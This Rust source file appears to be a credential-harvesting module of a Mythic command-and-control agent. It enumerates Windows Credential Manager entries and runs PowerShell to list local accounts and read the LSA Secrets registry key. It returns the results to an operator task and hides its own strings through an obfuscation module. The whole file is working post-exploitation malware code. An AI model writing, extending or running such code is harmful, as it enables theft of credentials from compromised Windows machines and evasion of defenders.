use crate::{AgentTask, mythic_error, mythic_success};
use serde::Deserialize;
use std::error::Error;

#[derive(Deserialize)]
struct CredentialsArgs {
    source: String,
}

#[cfg(target_os = "windows")]
unsafe fn wide_to_string(ptr: *const u16) -> String {
    if ptr.is_null() {
        return String::new();
    }
    let mut len = 0;
    while *ptr.offset(len) != 0 {
        len += 1;
    }
    let slice = std::slice::from_raw_parts(ptr, len as usize);
    String::from_utf16_lossy(slice)
}

#[cfg(target_os = "windows")]
unsafe fn enum_credentials() -> Result<String, String> {
    use winapi::um::wincred::*;
    use std::ptr;

    let mut count: u32 = 0;
    let mut creds: *mut PCREDENTIALW = ptr::null_mut();

    if CredEnumerateW(ptr::null(), 0, &mut count, &mut creds) == 0 {
        return Err(crate::obfstr::d(crate::obfstr::S_CRED_FAIL_ENUM));
    }

    let mut results = Vec::new();
    let cred_slice = std::slice::from_raw_parts(creds, count as usize);

    for cred_ptr in cred_slice {
        let cred = &**cred_ptr;
        let target = wide_to_string(cred.TargetName);
        let user = if !cred.UserName.is_null() {
            wide_to_string(cred.UserName)
        } else {
            String::new()
        };
        results.push(serde_json::json!({
            "target": target,
            "username": user,
            "type": cred.Type,
            "persist": cred.Persist,
        }));
    }

    CredFree(creds as *mut _);
    Ok(serde_json::to_string_pretty(&results).unwrap_or_default())
}

#[cfg(target_os = "windows")]
fn dump_vault() -> Result<String, Box<dyn Error>> {
    unsafe {
        enum_credentials().map_err(|e| e.into())
    }
}

#[cfg(target_os = "windows")]
fn dump_credman() -> Result<String, Box<dyn Error>> {
    unsafe {
        enum_credentials().map_err(|e| e.into())
    }
}

#[cfg(target_os = "windows")]
fn dump_sam() -> Result<String, Box<dyn Error>> {
    use std::process::Command;

    let output = Command::new("powershell")
        .arg("-Command")
        .arg("Get-LocalUser | Select-Object Name,Enabled,LastLogon | ConvertTo-Json")
        .output()?;

    if output.status.success() {
        Ok(String::from_utf8_lossy(&output.stdout).to_string())
    } else {
        Err(format!(
            "{}: {}",
            crate::obfstr::d(crate::obfstr::S_CRED_FAIL_ENUM),
            String::from_utf8_lossy(&output.stderr)
        ).into())
    }
}

#[cfg(target_os = "windows")]
fn dump_lsa_secrets() -> Result<String, Box<dyn Error>> {
    use std::process::Command;

    let output = Command::new("powershell")
        .arg("-Command")
        .arg("Get-ItemProperty 'HKLM:\\SECURITY\\Policy\\Secrets\\*' 2>$null | ConvertTo-Json")
        .output()?;

    if output.status.success() {
        let result = String::from_utf8_lossy(&output.stdout).to_string();
        if result.trim().is_empty() {
            Ok(crate::obfstr::d(crate::obfstr::S_CRED_NO_LSA))
        } else {
            Ok(result)
        }
    } else {
        Err(format!(
            "{}: {}",
            crate::obfstr::d(crate::obfstr::S_CRED_FAIL_LSA),
            String::from_utf8_lossy(&output.stderr)
        ).into())
    }
}

pub fn credentials_dump(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    #[cfg(not(target_os = "windows"))]
    {
        return Ok(mythic_error!(
            task.id,
            format!("Credentials dump {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))
        ));
    }

    #[cfg(target_os = "windows")]
    {
        let args: CredentialsArgs = serde_json::from_str(&task.parameters)?;

        let result = match args.source.as_str() {
            "vault" => dump_vault(),
            "credman" => dump_credman(),
            "sam" => dump_sam(),
            "lsa_secrets" => dump_lsa_secrets(),
            _ => {
                return Ok(mythic_error!(
                    task.id,
                    format!("{}: {}. {}", crate::obfstr::d(crate::obfstr::S_CRED_UNKNOWN), args.source, crate::obfstr::d(crate::obfstr::S_CRED_VALID))
                ));
            }
        };

        match result {
            Ok(output) => Ok(mythic_success!(task.id, output)),
            Err(e) => Ok(mythic_error!(task.id, format!("{}: {}", crate::obfstr::d(crate::obfstr::S_CRED_FAIL), e))),
        }
    }
}
